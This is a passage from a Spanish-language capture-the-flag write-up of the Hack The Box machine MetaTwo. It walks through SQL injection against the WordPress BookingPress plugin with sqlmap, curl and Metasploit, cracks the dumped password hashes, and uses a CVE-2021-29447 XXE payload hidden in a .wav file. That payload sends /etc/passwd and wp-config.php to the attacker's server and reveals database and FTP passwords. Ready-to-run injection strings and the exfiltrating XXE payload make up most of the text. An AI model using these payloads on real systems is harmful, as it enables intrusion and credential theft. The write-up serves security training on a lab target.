| wp_bookingpress_entries              |
| wp_bookingpress_form_fields          |
| wp_bookingpress_notifications        |
| wp_bookingpress_payment_logs         |
| wp_bookingpress_services             |
| wp_bookingpress_servicesmeta         |
| wp_bookingpress_settings             |
| wp_commentmeta                       |
| wp_comments                          |
| wp_links                             |
| wp_options                           |
| wp_postmeta                          |
| wp_posts                             |
| wp_term_relationships                |
| wp_term_taxonomy                     |
| wp_termmeta                          |
| wp_terms                             |
| wp_usermeta                          |
| wp_users                             |
+--------------------------------------+
[14:22:03] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/metapress.htb'
[*] ending @ 14:22:03 /2023-04-14/
```

* Veamos que hay en la tabla **wp-users**. 

-------
**CUIDADO**: cuando te pregunte **common password suffixes?**, dile que **No** porque si no se tardara mucho en sacar el resultado, a lo demás dale que **Si**:

-------

```bash
sqlmap -r admin.req -p total_service -D blog -T wp_users --dump
        ___
       __H__                                                                                                                           
 ___ ___[)]_____ ___ ___  {1.7.2#stable}                                                                                               

|_ -| . [,]     | .'| . |                                                                                                              
|___|_  [)]_|_|_|__,|  _|                                                                                                              
      |_|V...       |_|   https://sqlmap.org                                                                                           
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
[*] starting @ 14:22:36 /2023-04-14/
[14:22:36] [INFO] parsing HTTP request from 'admin.req'
...
do you want to use common password suffixes? (slow!) [y/N] n
[15:03:05] [INFO] starting dictionary-based cracking (phpass_passwd)
[15:03:05] [WARNING] multiprocessing hash cracking is currently not supported on this platform
[15:04:13] [WARNING] no clear password(s) found                                                                                       
Database: blog
Table: wp_users
[2 entries]
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+

| ID | user_url             | user_pass                          | user_email            | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+

| 1  | http://metapress.htb | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. | admin@metapress.htb   | admin      | 0           | admin        | admin         | 2022-06-23 17:58:28 | <blank>             |
| 2  | <blank>              | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 | manager@metapress.htb | manager    | 0           | manager      | manager       | 2022-06-23 18:07:55 | <blank>             |
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
```
Excelente, tenemos dos hashes que podemos descifrar y dos usuarios.

### Realizando SQL Injection de Forma Manual {#SQL2}

Como bien sabemos, se esta ocupando **WordPress** para realizar la página web de la máquina víctima, entonces podemos buscar cuales son las tablas por defecto que tiene WordPress, esto para encontrar la tabla que contenga a los usuarios y contraseñas para entrar en su login, busquemos.

Aquí podemos encontrar las columnas que almacena la tabla **wp_users**, pues en esta tabla se encuentran los usuarios y contraseñas:
* <a href="https://usersinsights.com/wordpress-user-database-tables/" target="_blank">How WordPress user data is stored in the database</a>

Ahora bien, vamos a tratar de dumpear las mismas credenciales que ya obtuvimos con **SQLMAP**, por lo que entiendo en la **inyección SQL**, son necesarios 3 parámetros para que funcione, siendo estos:
* *@@version*
* *@@version_comment*
* *@@version_compile_os,1,2,3,4,5,6*

Quiero creer que podemos cambiarlos y meter la tabla **wp_users** para dumpear las credenciales, vamos a probarlo.

* Cambia el primer parámetro por cualquiera de la tabla **wp_users** y enfoca la query hacia la tabla **wp_users**:
```json
curl -s -q 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=3aae7c8d8b&category_id=33&total_service=-7502) UNION ALL SELECT user_login,@@version_comment,@@version_compile_os,1,2,3,4,5,6 from wp_users-- -' | jq .
[
  {
    "bookingpress_service_id": "admin",
    "bookingpress_category_id": "Debian 11",
    "bookingpress_service_name": "debian-linux-gnu",
    "bookingpress_service_price": "$1.00",
    "bookingpress_service_duration_val": "2",
    "bookingpress_service_duration_unit": "3",
    "bookingpress_service_description": "4",
    "bookingpress_service_position": "5",
    "bookingpress_servicedate_created": "6",
    "service_price_without_currency": 1,
    "img_url": "http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/images/placeholder-img.jpg"
  },
  {
    "bookingpress_service_id": "manager",
    "bookingpress_category_id": "Debian 11",
    "bookingpress_service_name": "debian-linux-gnu",
    "bookingpress_service_price": "$1.00",
    "bookingpress_service_duration_val": "2",
    "bookingpress_service_duration_unit": "3",
    "bookingpress_service_description": "4",
    "bookingpress_service_position": "5",
    "bookingpress_servicedate_created": "6",
    "service_price_without_currency": 1,
    "img_url": "http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/images/placeholder-img.jpg"
  }
]
```

Muy bien, podemos ver los usuarios que tiene registrado el **WordPress**, vamos a ver si podemos conseguir las contraseñas:
```json
curl -s -q 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=3aae7c8d8b&category_id=33&total_service=-7502) UNION ALL SELECT user_login,user_pass,@@version_compile_os,1,2,3,4,5,6 from wp_users-- -' | jq .
[
  {
    "bookingpress_service_id": "admin",
    "bookingpress_category_id": "$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.",
    "bookingpress_service_name": "debian-linux-gnu",
    "bookingpress_service_price": "$1.00",
    "bookingpress_service_duration_val": "2",
    "bookingpress_service_duration_unit": "3",
    "bookingpress_service_description": "4",
    "bookingpress_service_position": "5",
    "bookingpress_servicedate_created": "6",
    "service_price_without_currency": 1,
    "img_url": "http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/images/placeholder-img.jpg"
  },
  {
    "bookingpress_service_id": "manager",
    "bookingpress_category_id": "$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70",
    "bookingpress_service_name": "debian-linux-gnu",
    "bookingpress_service_price": "$1.00",
    "bookingpress_service_duration_val": "2",
    "bookingpress_service_duration_unit": "3",
    "bookingpress_service_description": "4",
    "bookingpress_service_position": "5",
    "bookingpress_servicedate_created": "6",
    "service_price_without_currency": 1,
    "img_url": "http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/images/placeholder-img.jpg"
  }
]
```
Excelente, podemos ver que esta es otra forma de obtener las credenciales.

### Obteniendo Credenciales con Módulo de Metasploit {#SQL3}

Dentro de **Metasploit**, existe un módulo que nos automatiza la **inyección SQL**, veamos que resultado obtenemos utilizando dicho módulo. 

Vamos por pasos:

* Abre **Metasploit**:
```bash
msfconsole
```

* Busca el módulo de **bookingpress**:
```bash
msf6 > search bookingpress
*
Matching Modules
================

   #  Name                                                     Disclosure Date  Rank    Check  Description
   -  ----                                                     ---------------  ----    -----  -----------
   0  auxiliary/gather/wp_bookingpress_category_services_sqli  2022-02-28       normal  Yes    Wordpress BookingPress bookingpress_front_get_category_services SQLi                                                                     
*
Interact with a module by name or index. For example info 0, use 0 or use auxiliary/gather/wp_bookingpress_category_services_sqli                                                                                                       
*
msf6 > use 0
msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) >
```

* Configuralo con la IP/Host de la máquina víctima y cambia el **TARGETURI** por la página donde encontramos el uso de **bookingpress**:
```bash
msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) > set RHOSTS metapress.htb
RHOSTS => metapress.htb
msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) > set TARGETURI /events/
TARGETURI => /events/
```

* Ejecuta el módulo:
```bash
msf6 auxiliary(gather/wp_bookingpress_category_services_sqli) > exploit
[*] Running module against 10.10.11.186
*
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Extracting credential information
Wordpress User Credentials
==========================
*
 Username  Email                  Hash
 --------  -----                  ----
 admin     admin@metapress.htb    $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
 manager   manager@metapress.htb  $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
*
[*] Auxiliary module execution completed
```
Y listo, ya tenemos otra forma de obtener los hashes de las credenciales.

### Descifrando Hashes {#Hash}

Para descifrar los hashes vamos a usar la herramienta **John The Ripper**, al chile me da hueva explicarte como instalarla, así que te dejo un link:
* <a href="https://www.kolibers.com/blog/hash_cracking_con_john_the_ripper.html" target="_blank">Password Cracking con John The Ripper</a>

Hagamos esto por pasos:

* Guarda las credenciales en un archivo:
```bash
nano crackhash.txt
```

* Ahora usemos **John** para que lo descifre a la fuerza, cuando tengas un resultado cancela el comando:
```bash
john -w=/usr/share/wordlists/rockyou.txt crackhash.txt 
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 128/128 SSE2 4x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
partylikearockstar (?)     
1g 0:00:03:36 4.76% (ETA: 16:35:56) 0.004617g/s 3626p/s 4135c/s 4135C/s spammy456..spain4eva
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session aborted
```
Excelente ya tenemos una contraseña y tenemos el usuario, pero no se cual de las dos contraseñas pudo crackear, ya que solo saco una. Vamos a usar la herramienta **Hashcat**.

* Añade a las contraseñas el usuario separado por '**:**':
```bash
admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
```

* Ejecuta **Hashcat** con el parámetro **--user**:

```bash
hashcat creds /usr/share/wordlists/rockyou.txt  --user
hashcat (v6.2.6) starting in autodetect mode
*
OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-penryn-Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz, 9922/19908 MB (4096 MB allocatable), 4MCU
*
Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1
*
Host memory required for this attack: 1 MB
*
Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec
*
$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:partylikearockstar
```

Excelente, ya sabemos que esa contraseña pertenece al usuario manager.

### Accediendo a la Página Web y Obteniendo Credenciales de FTP {#Web}

Escribe las credenciales en el login de **WordPress**:

![](/assets/images/htb-writeup-metatwo/Captura14.png)

Entremos:

![](/assets/images/htb-writeup-metatwo/Captura15.png)

Mmmm veamos que nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-metatwo/Captura16.png">
</p>

Nos dice la versión de **WordPress** que es la **versión 5.6.2**, busquemos un Exploit para este. 

Encontré este:
* <a href="https://github.com/motikan2010/CVE-2021-29447" target="_blank">Repositorio de motikan2010: WordPress 5.6-5.7 - Authenticated (Author+) XXE (CVE-2021-29447)</a>

Lo que debemos hacer, será cargar un Payload en formato **.wav** para que nos regrese una Shell. Esto fue bastante complicado de encontrar, pero aquí hay una forma de usar este Exploit:
* <a href="https://tryhackme.com/room/wordpresscve202129447" target="_blank">Wordpress: CVE-2021-29447</a>

Entonces, vamos a hacer lo mismo que este blog, ya sabes por pasos:

* Creamos el Payload con nuestra IP y un puerto:
```bash
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://TU_IP:Un_Puerto/NAMEEVIL.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

* Creamos un archivo con el nombre **NAMEEVIL.dtd** y le metemos un Payload que será como él escucha:
```html
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=../etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://Tu_IP:Un_Puerto/?p=%file;'>" >
```

* Abrimos un servidor en **Python** en donde estén el Payload y el otro archivo, OJO, debe ser abierto en el mismo puerto que pusiste en él ambos archivos:
```bash
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

* Cargamos el Payload **.wav** a la página:

![](/assets/images/htb-writeup-metatwo/Captura17.png)

* Deberíamos tener una respuesta en el servidor de **Python**:
```bash
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.186 - - [14/Apr/2023 15:53:53] "GET /NAMEEVIL.dtd HTTP/1.1" 200 -
10.10.11.186 - - [14/Apr/2023 15:53:53] "GET /?p=jVVZU/JKEH2+VvkfhhKMoARUQBARAoRNIEDCpgUhIRMSzEYyYVP87TdBBD71LvAANdNzTs/p6dMPaUMyTk9CgQBgJAg0ToVAFwFy/gsc4njOgkDUTdDVTaFhQssCgdDpiQBFWYMXAMtn2TpRI7ErgPGKPsGAP3l68glXW9HN6gHEtqC5Rf9+vk2Trf9x3uAsa+Ek8eN8g6DpLtXKuxix2ygxyzDCzMwteoX28088SbfQr2mUKJpxIRR9zClu1PHZ/FcWOYkzLYgA0t0LAVkDYxNySNYmh0ydHwVa+A+GXIlo0eSWxEZiXOUjxxSu+gcaXVE45ECtDIiDvK5hCIwlTps4S5JsAVl0qQXd5tEvPFS1SjDbmnwR7LcLNFsjmRK1VUtEBlzu7nmIYBr7kqgQcYZbdFxC/C9xrvRuXKLep1lZzhRWVdaI1m7q88ov0V8KO7T4fyFnCXr/qEK/7NN01dkWOcURa6/hWeby9AQEAGE7z1dD8tgpjK6BtibPbAie4MoCnCYAmlOQhW8jM5asjSG4wWN42F04VpJoMyX2iew7PF8fLO159tpFKkDElhQZXV4ZC9iIyIF1Uh2948/3vYy/2WoWeq+51kq524zMXqeYugXa4+WtmsazoftvN6HJXLtFssdM2NIre/18eMBfj20jGbkb9Ts2F6qUZr5AvE3EJoMwv9DJ7n3imnxOSAOzq3RmvnIzFjPEt9SA832jqFLFIplny/XDVbDKpbrMcY3I+mGCxxpDNFrL80dB2JCk7IvEfRWtNRve1KYFWUba2bl2WerNB+/v5GXhI/c2e+qtvlHUqXqO/FMpjFZh3vR6qfBUTg4Tg8Doo1iHHqOXyc+7fERNkEIqL1zgZnD2NlxfFNL+O3VZb08S8RhqUndU9BvFViGaqDJHFC9JJjsZh65qZ34hKr6UAmgSDcsik36e49HuMjVSMnNvcF4KPHzchwfWRng4ryXxq2V4/dF6vPXk/6UWOybscdQhrJinmIhGhYqV9lKRtTrCm0lOnXaHdsV8Za+DQvmCnrYooftCn3/oqlwaTju59E2wnC7j/1iL/VWwyItID289KV+6VNaNmvE66fP6Kh6cKkN5UFts+kD4qKfOhxWrPKr5CxWmQnbKflA/q1OyUBZTv9biD6Uw3Gqf55qZckuRAJWMcpbSvyzM4s2uBOn6Uoh14Nlm4cnOrqRNJzF9ol+ZojX39SPR60K8muKrRy61bZrDKNj7FeNaHnAaWpSX+K6RvFsfZD8XQQpgC4PF/gAqOHNFgHOo6AY0rfsjYAHy9mTiuqqqC3DXq4qsvQIJIcO6D4XcUfBpILo5CVm2YegmCnGm0/UKDO3PB2UtuA8NfW/xboPNk9l28aeVAIK3dMVG7txBkmv37kQ8SlA24Rjp5urTfh0/vgAe8AksuA82SzcIpuRI53zfTk/+Ojzl3c4VYNl8ucWyAAfYzuI2X+w0RBawjSPCuTN3tu7lGJZiC1AAoryfMiac2U5CrO6a2Y7AhV0YQWdYudPJwp0x76r/Nw== HTTP/1.1" 200 -
10.10.11.186 - - [14/Apr/2023 15:53:53] "GET /NAMEEVIL.dtd HTTP/1.1" 200 -
10.10.11.186 - - [14/Apr/2023 15:53:54] "GET /?p=jVVZU/JKEH2+VvkfhhKMoARUQBARAoRNIEDCpgUhIRMSzEYyYVP87TdBBD71LvAANdNzTs/p6dMPaUMyTk9CgQBgJAg0ToVAFwFy/gsc4njOgkDUTdDVTaFhQssCgdDpiQBFWYMXAMtn2TpRI7ErgPGKPsGAP3l68glXW9HN6gHEtqC5Rf9+vk2Trf9x3uAsa+Ek8eN8g6DpLtXKuxix2ygxyzDCzMwteoX28088SbfQr2mUKJpxIRR9zClu1PHZ/FcWOYkzLYgA0t0LAVkDYxNySNYmh0ydHwVa+A+GXIlo0eSWxEZiXOUjxxSu+gcaXVE45ECtDIiDvK5hCIwlTps4S5JsAVl0qQXd5tEvPFS1SjDbmnwR7LcLNFsjmRK1VUtEBlzu7nmIYBr7kqgQcYZbdFxC/C9xrvRuXKLep1lZzhRWVdaI1m7q88ov0V8KO7T4fyFnCXr/qEK/7NN01dkWOcURa6/hWeby9AQEAGE7z1dD8tgpjK6BtibPbAie4MoCnCYAmlOQhW8jM5asjSG4wWN42F04VpJoMyX2iew7PF8fLO159tpFKkDElhQZXV4ZC9iIyIF1Uh2948/3vYy/2WoWeq+51kq524zMXqeYugXa4+WtmsazoftvN6HJXLtFssdM2NIre/18eMBfj20jGbkb9Ts2F6qUZr5AvE3EJoMwv9DJ7n3imnxOSAOzq3RmvnIzFjPEt9SA832jqFLFIplny/XDVbDKpbrMcY3I+mGCxxpDNFrL80dB2JCk7IvEfRWtNRve1KYFWUba2bl2WerNB+/v5GXhI/c2e+qtvlHUqXqO/FMpjFZh3vR6qfBUTg4Tg8Doo1iHHqOXyc+7fERNkEIqL1zgZnD2NlxfFNL+O3VZb08S8RhqUndU9BvFViGaqDJHFC9JJjsZh65qZ34hKr6UAmgSDcsik36e49HuMjVSMnNvcF4KPHzchwfWRng4ryXxq2V4/dF6vPXk/6UWOybscdQhrJinmIhGhYqV9lKRtTrCm0lOnXaHdsV8Za+DQvmCnrYooftCn3/oqlwaTju59E2wnC7j/1iL/VWwyItID289KV+6VNaNmvE66fP6Kh6cKkN5UFts+kD4qKfOhxWrPKr5CxWmQnbKflA/q1OyUBZTv9biD6Uw3Gqf55qZckuRAJWMcpbSvyzM4s2uBOn6Uoh14Nlm4cnOrqRNJzF9ol+ZojX39SPR60K8muKrRy61bZrDKNj7FeNaHnAaWpSX+K6RvFsfZD8XQQpgC4PF/gAqOHNFgHOo6AY0rfsjYAHy9mTiuqqqC3DXq4qsvQIJIcO6D4XcUfBpILo5CVm2YegmCnGm0/UKDO3PB2UtuA8NfW/xboPNk9l28aeVAIK3dMVG7txBkmv37kQ8SlA24Rjp5urTfh0/vgAe8AksuA82SzcIpuRI53zfTk/+Ojzl3c4VYNl8ucWyAAfYzuI2X+w0RBawjSPCuTN3tu7lGJZiC1AAoryfMiac2U5CrO6a2Y7AhV0YQWdYudPJwp0x76r/Nw== HTTP/1.1" 200 -
```

* En otra terminal abrimos **PHP**:
```php
php -a                
Interactive shell
php >
```

* Copiamos el siguiente comando:
```php
php > echo zlib_decode(base64_decode(''));
```

* Adentro de las comillas simples, vamos a poner el segundo **GET** que obtuvimos en el servidor de Python desde la **jVVZU** hasta **/NW==**:
```php
php > echo zlib_decode(base64_decode('jVRNj5swEL3nV3BspUSGkGSDj22lXjaVuum9MuAFusamNiShv74zY8gmgu5WHtB8vHkezxisMS2/8BCWRZX5d1pplgpXLnIha6MBEcEaDNY5yxxAXjWmjTJFpRfovfA1LIrPg1zvABTDQo3l8jQL0hmgNny33cYbTiYbSRmai0LUEpm2fBdybxDPjXpHWQssbsejNUeVnYRlmchKycic4FUD8AdYoBDYNcYoppp8lrxSAN/DIpUSvDbBannGuhNYpN6Qe3uS0XUZFhOFKGTc5Hh7ktNYc+kxKUbx1j8mcj6fV7loBY4lRrk6aBuw5mYtspcOq4LxgAwmJXh97iCqcnjh4j3KAdpT6SJ4BGdwEFoU0noCgk2zK4t3Ik5QQIc52E4zr03AhRYttnkToXxFK/jUFasn2Rjb4r7H3rWyDj6IvK70x3HnlPnMmbmZ1OTYUn8n/XtwAkjLC5Qt9VzlP0XT0gDDIe29BEe15Sst27OxL5QLH2G45kMk+OYjQ+NqoFkul74jA+QNWiudUSdJtGt44ivtk4/Y/yCDz8zB1mnniAfuWZi8fzBX5gTfXDtBu6B7iv6lpXL+DxSGoX8NPiqwNLVkI+j1vzUes62gRv8nSZKEnvGcPyAEN0BnpTW6+iPaChneaFlmrMy7uiGuPT0j12cIBV8ghvd3rlG9+63oDFseRRE/9Mfvj8FR2rHPdy3DzGehnMRP+LltfLt2d+0aI9O9wE34hyve2RND7xT7Fw=='));
```

* Activamos el comando y vemos el resultado:
```php
php > echo zlib_decode(base64_decode('jVRNj5swEL3nV3BspUSGkGSDj22lXjaVuum9MuAFusamNiShv74zY8gmgu5WHtB8vHkezxisMS2/8BCWRZX5d1pplgpXLnIha6MBEcEaDNY5yxxAXjWmjTJFpRfovfA1LIrPg1zvABTDQo3l8jQL0hmgNny33cYbTiYbSRmai0LUEpm2fBdybxDPjXpHWQssbsejNUeVnYRlmchKycic4FUD8AdYoBDYNcYoppp8lrxSAN/DIpUSvDbBannGuhNYpN6Qe3uS0XUZFhOFKGTc5Hh7ktNYc+kxKUbx1j8mcj6fV7loBY4lRrk6aBuw5mYtspcOq4LxgAwmJXh97iCqcnjh4j3KAdpT6SJ4BGdwEFoU0noCgk2zK4t3Ik5QQIc52E4zr03AhRYttnkToXxFK/jUFasn2Rjb4r7H3rWyDj6IvK70x3HnlPnMmbmZ1OTYUn8n/XtwAkjLC5Qt9VzlP0XT0gDDIe29BEe15Sst27OxL5QLH2G45kMk+OYjQ+NqoFkul74jA+QNWiudUSdJtGt44ivtk4/Y/yCDz8zB1mnniAfuWZi8fzBX5gTfXDtBu6B7iv6lpXL+DxSGoX8NPiqwNLVkI+j1vzUes62gRv8nSZKEnvGcPyAEN0BnpTW6+iPaChneaFlmrMy7uiGuPT0j12cIBV8ghvd3rlG9+63oDFseRRE/9Mfvj8FR2rHPdy3DzGehnMRP+LltfLt2d+0aI9O9wE34hyve2RND7xT7Fw=='));
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
```
¡Muy Bien! Ósea que podemos listar lo que queramos, pero existe un archivo en **WordPress** que almacena contraseñas y usuarios. 

Tratemos de listarla:

* Vamos a cambiar el directorio a listar en el archivo **NAMEEVIL.dld** y donde está el directorio **/etc/passwd** vamos a poner **/wp-config.php**:
```html
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=../wp-config.php">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.16:8000/?p=%file;'>" >
```

* Y hacemos lo mismo que hicimos, abrimos (o cerramos y abrimos) un servidor en **Python** y cargamos el Payload **.wav** a la página. Copiamos el segundo **GET** en la terminal donde está activo el **PHP**, con el mismo comando **echo zlib_decode(base64_decode(''));**, lo activamos y deberíamos tener el siguiente resultado:
```php
php > echo zlib_decode(base64_decode('jVVZU/JKEH2+VvkfhhKMoARUQBARAoRNIEDCpgUhIRMSzEYyYVP87TdBBD71LvAANdNzTs/p6dMPaUMyTk9CgQBgJAg0ToVAFwFy/gsc4njOgkDUTdDVTaFhQssCgdDpiQBFWYMXAMtn2TpRI7ErgPGKPsGAP3l68glXW9HN6gHEtqC5Rf9+vk2Trf9x3uAsa+Ek8eN8g6DpLtXKuxix2ygxyzDCzMwteoX28088SbfQr2mUKJpxIRR9zClu1PHZ/FcWOYkzLYgA0t0LAVkDYxNySNYmh0ydHwVa+A+GXIlo0eSWxEZiXOUjxxSu+gcaXVE45ECtDIiDvK5hCIwlTps4S5JsAVl0qQXd5tEvPFS1SjDbmnwR7LcLNFsjmRK1VUtEBlzu7nmIYBr7kqgQcYZbdFxC/C9xrvRuXKLep1lZzhRWVdaI1m7q88ov0V8KO7T4fyFnCXr/qEK/7NN01dkWOcURa6/hWeby9AQEAGE7z1dD8tgpjK6BtibPbAie4MoCnCYAmlOQhW8jM5asjSG4wWN42F04VpJoMyX2iew7PF8fLO159tpFKkDElhQZXV4ZC9iIyIF1Uh2948/3vYy/2WoWeq+51kq524zMXqeYugXa4+WtmsazoftvN6HJXLtFssdM2NIre/18eMBfj20jGbkb9Ts2F6qUZr5AvE3EJoMwv9DJ7n3imnxOSAOzq3RmvnIzFjPEt9SA832jqFLFIplny/XDVbDKpbrMcY3I+mGCxxpDNFrL80dB2JCk7IvEfRWtNRve1KYFWUba2bl2WerNB+/v5GXhI/c2e+qtvlHUqXqO/FMpjFZh3vR6qfBUTg4Tg8Doo1iHHqOXyc+7fERNkEIqL1zgZnD2NlxfFNL+O3VZb08S8RhqUndU9BvFViGaqDJHFC9JJjsZh65qZ34hKr6UAmgSDcsik36e49HuMjVSMnNvcF4KPHzchwfWRng4ryXxq2V4/dF6vPXk/6UWOybscdQhrJinmIhGhYqV9lKRtTrCm0lOnXaHdsV8Za+DQvmCnrYooftCn3/oqlwaTju59E2wnC7j/1iL/VWwyItID289KV+6VNaNmvE66fP6Kh6cKkN5UFts+kD4qKfOhxWrPKr5CxWmQnbKflA/q1OyUBZTv9biD6Uw3Gqf55qZckuRAJWMcpbSvyzM4s2uBOn6Uoh14Nlm4cnOrqRNJzF9ol+ZojX39SPR60K8muKrRy61bZrDKNj7FeNaHnAaWpSX+K6RvFsfZD8XQQpgC4PF/gAqOHNFgHOo6AY0rfsjYAHy9mTiuqqqC3DXq4qsvQIJIcO6D4XcUfBpILo5CVm2YegmCnGm0/UKDO3PB2UtuA8NfW/xboPNk9l28aeVAIK3dMVG7txBkmv37kQ8SlA24Rjp5urTfh0/vgAe8AksuA82SzcIpuRI53zfTk/+Ojzl3c4VYNl8ucWyAAfYzuI2X+w0RBawjSPCuTN3tu7lGJZiC1AAoryfMiac2U5CrO6a2Y7AhV0YQWdYudPJwp0x76r/Nw=='));
<?php
/** The name of the database for WordPress */
define( 'DB_NAME', 'blog' );
/** MySQL database username */
define( 'DB_USER', 'blog' );
/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );
/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );
/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );
...
```
¡Excelente! Tenemos la contraseña y usuario del **servicio FTP**, entremos ahí y veamos qué hay.

### Enumeración Servicio FTP {#FTP}

Entremos:
```batch
ftp 10.10.11.186
Connected to 10.10.11.186.
220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
Name (10.10.11.186:berserkwings): metapress.htb
331 Password required for metapress.htb
Password: 
230 User metapress.htb logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||33790|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   4 0        metapress.htb     4096 Oct  5  2022 .
drwxr-xr-x   4 0        metapress.htb     4096 Oct  5  2022 ..
drwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5  2022 blog
drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5  2022 mailer
226 Transfer complete
```

Hay dos directorios, pero el de **mailer** es el que nos interesa, entremos ahí:
```batch
ftp> cd mailer
250 CWD command successful
ftp> ls -la
229 Entering Extended Passive Mode (|||54803|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5  2022 .
drwxr-xr-x   4 0        metapress.htb     4096 Oct  5  2022 ..
drwxr-xr-x   4 metapress.htb metapress.htb     4096 Oct  5  2022 PHPMailer
-rw-r--r--   1 metapress.htb metapress.htb     1126 Jun 22  2022 send_email.php
226 Transfer complete
```

Vamos a descargar y a ver ese archivo llamado **send_email.php**:
```batch
ftp> get send_email.php
local: send_email.php remote: send_email.php
229 Entering Extended Passive Mode (|||62755|)
